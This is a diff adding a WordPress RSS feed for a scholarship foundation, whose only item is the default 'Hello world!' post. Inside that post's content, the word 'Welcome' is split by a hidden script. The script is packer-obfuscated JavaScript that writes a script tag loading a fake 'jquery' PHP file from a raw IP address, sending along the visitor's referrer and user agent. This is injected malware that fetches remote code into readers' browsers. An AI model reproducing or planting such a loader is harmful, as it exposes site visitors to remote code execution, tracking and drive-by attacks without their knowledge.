@@ -1,0 +1,44 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Stubb&#8217;s Educational Foundation, Inc.</title>
+	<atom:link href="http://www.stubbsfoundation.org/feed" rel="self" type="application/rss+xml" />
+	<link>http://www.stubbsfoundation.org</link>
+	<description>Providing Music and Academic Scholarships</description>
+	<lastBuildDate>Wed, 07 Feb 2018 00:24:18 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=4.9.4</generator>
+	<item>
+		<title>Hello world!</title>
+		<link>http://www.stubbsfoundation.org/about</link>
+		<comments>http://www.stubbsfoundation.org/about#comments</comments>
+		<pubDate>Wed, 29 Apr 2015 19:57:14 +0000</pubDate>
+		<dc:creator><![CDATA[]]></dc:creator>
+				<category><![CDATA[Uncategorized]]></category>
+
+		<guid isPermaLink="false">http://www.stubbsfoundation.org/?p=1</guid>
+		<description><![CDATA[Welcome to WordPress. This is your first post. Edit or delete it, then start blogging!]]></description>
+				<content:encoded><![CDATA[<p>Welcome <noindex><script id="wpinfo-pst1" type="text/javascript" rel="nofollow">eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6("<a g=\'2\' c=\'d\' e=\'b/2\' 4=\'7://5.8.9.f/1/h.s.t?r="+3(0.p)+"\\o="+3(j.i)+"\'><\\/k"+"l>");n m="q";',30,30,'document||javascript|encodeURI|src||write|http|45|67|script|text|rel|nofollow|type|97|language|jquery|userAgent|navigator|sc|ript|hztrb|var|u0026u|referrer|kffnd||js|php'.split('|'),0,{}))
+</script></noindex> to WordPress. This is your first post. Edit or delete it, then start blogging!</p>
+]]></content:encoded>
+			<wfw:commentRss>http://www.stubbsfoundation.org/about/feed</wfw:commentRss>
+		<slash:comments>1</slash:comments>
+		</item>
+	</channel>
+</rss>
+
+<!--
+Performance optimized by W3 Total Cache. Learn more: https://www.w3-edge.com/products/
+
+
+Served from: www.stubbsfoundation.org @ 2018-03-08 20:19:31 by W3 Total Cache
+-->
